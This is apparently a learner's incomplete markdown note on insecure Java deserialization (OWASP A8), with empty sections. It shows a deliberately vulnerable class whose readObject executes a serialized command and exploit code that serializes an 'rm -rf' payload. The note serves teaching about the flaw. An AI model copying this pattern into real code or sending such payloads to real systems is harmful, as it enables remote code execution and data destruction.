<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [A8 - Insecure Deserialization](#a8---insecure-deserialization)
  - [Insecure Deserialization](#insecure-deserialization)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# A8 - Insecure Deserialization

## Insecure Deserialization

### 1. Concept 

### 2. What is Serialization

Today, the most popular data format for serializin data is JSON.
Before that, it was XML.

### 3. The Simplest Exploit

Java Deserialization vulnerability (executing `readObject()` before the casting occurs):

```java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

Class that supports serialization and with dangerous implementations on `readObject()`:

```java
package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

	private static final long serialVersionUID = 1;

	private String taskName;
	private String taskAction;
	private LocalDateTime requestedExecutionTime;

	public VulnerableTaskHolder(String taskName, String taskAction) {
		super();
		this.taskName = taskName;
		this.taskAction = taskAction;
		this.requestedExecutionTime = LocalDateTime.now();
	}

	private void readObject( ObjectInputStream stream ) throws Exception {
		//deserialize data so taskName and taskAction are available
		stream.defaultReadObject();

		//blindly run some code. #code injection
		Runtime.getRuntime().exec(taskAction);
	}
}
```

Exploit

```java
VulnerableTaskHolder go = new VulnerableTaskHolder("delete all", "rm -rf somefile");

ByteArrayOutputStream bos = new ByteArrayOutputStream();

ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(go);
oos.flush();

byte[] exploit = bos.toByteArray();
```

### 4. What is a Gadgets Chain

### 5. Let's try

\#FIXME script/A8-insecure-deserialization.java